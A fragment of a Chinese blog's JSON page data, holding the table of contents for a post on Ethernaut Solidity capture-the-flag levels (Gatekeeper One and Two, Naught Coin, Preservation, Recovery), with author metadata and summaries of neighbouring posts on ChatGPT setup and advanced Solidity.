href=\"#%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F%E5%9C%A8%E5%AD%98%E5%82%A8%E4%B8%AD%E7%9A%84%E5%B8%83%E5%B1%80\"><span class=\"toc-text\">状态变量在存储中的布局</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#httpslearnblockchain.cndocssolidityinternalslayout_in_storage.html\"><span class=\"toc-text\">（https:&#x2F;&#x2F;learnblockchain.cn&#x2F;docs&#x2F;solidity&#x2F;internals&#x2F;layout_in_storage.html）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#gatekeeper-one\"><span class=\"toc-text\">14.Gatekeeper One</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">基本类型之间的转换</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">隐式转换</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%98%BE%E7%A4%BA%E8%BD%AC%E6%8D%A2\"><span class=\"toc-text\">显示转换</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BD%8D%E6%8E%A9%E7%A0%81\"><span class=\"toc-text\">位掩码</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#gatekeeper-two\"><span class=\"toc-text\">15.Gatekeeper Two</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#assembly\"><span class=\"toc-text\">Assembly</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#xor%E6%8C%89%E4%BD%8D%E5%BC%82%E6%88%96\"><span class=\"toc-text\">XOR（按位异或）</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#naught-coin\"><span class=\"toc-text\">16.Naught Coin</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#erc20\"><span class=\"toc-text\">ERC20</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E9%9A%8F%E6%9C%BA%E6%95%B0\"><span class=\"toc-text\">随机数</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#preservation\"><span class=\"toc-text\">17.Preservation</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#recovery\"><span class=\"toc-text\">18.Recovery</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#create%E5%92%8Ccreate2%E5%9C%A8%E4%B9%8B%E5%89%8D%E5%86%99%E7%9A%84solidity%E8%BF%9B%E9%98%B6%E9%87%8C%E9%9D%A2%E6%9C%89\"><span class=\"toc-text\">create和create2（在之前写的solidity进阶里面有）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%90%88%E7%BA%A6%E7%9A%84%E5%9C%B0%E5%9D%80%E8%AE%A1%E7%AE%97httpsethereum.stackexchange.comquestions760how-is-the-address-of-an-ethereum-contract-computed761761\"><span class=\"toc-text\">以太坊合约的地址计算（https:&#x2F;&#x2F;ethereum.stackexchange.com&#x2F;questions&#x2F;760&#x2F;how-is-the-address-of-an-ethereum-contract-computed&#x2F;761#761）</span></a></li></ol></li></ol></li></ol>","author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ChatGPT的搭建","uid":"462812fbbc64f9c8b5d4c209bcb7fd5a","slug":"ChatGPT","date":"2023-03-20T04:15:54.000Z","updated":"2023-03-20T04:19:47.035Z","comments":true,"path":"api/articles/ChatGPT.json","keywords":null,"cover":"https://s2.loli.net/2022/12/17/6h9QCTbrRjUsx1c.jpg","text":"什么是ChatGPT 我是 Assistant，一个由 OpenAI 训练的大型语言模型。我可以回答您的问题，并帮助您了解更多关于特定主题的信息。我并不具备自己的意识，只能通过我所学到的知识来回答问题。如果您有任何其他问题，请随时问我。我很乐意帮助您。 —ChatGPT 什么是O...","link":"","photos":[],"count_time":{"symbolsCount":816,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"ChatGPT","slug":"ChatGPT","count":1,"path":"api/tags/ChatGPT.json"}],"author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"solidity进阶","uid":"26cdbf141378457625c3c7f264148e8f","slug":"solidity进阶","date":"2022-12-07T15:23:57.000Z","updated":"2022-12-17T12:18:43.276Z","comments":true,"path":"api/articles/solidity进阶.json","keywords":null,"cover":"https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg","text":"solidity进阶 16.函数重载 重载 solidity中允许函数进行重载（overloading），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，solidity不允许修饰器（modifier）重载。 函数重载 举个例子，我们可以定义两个都叫s...","link":"","photos":[],"count_time":{"symbolsCount":"36k","symbolsTime":"33 mins."},"categories":[],"tags":[{"name":"solidity","slug":"solidity","count":2,"path":"api/tags/solidity.json"}],"author":{"name":"cocoZ","slug":"cocoz","avatar":"https://s2.loli.net/2022/12/17/7LdKkiUEVc9wQ1x.jpg","link":"/","description":"想越来越优秀！！！<br/>要变得越来越听话！！！ <br/> @ <b·>QQ:1601760796<b>","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}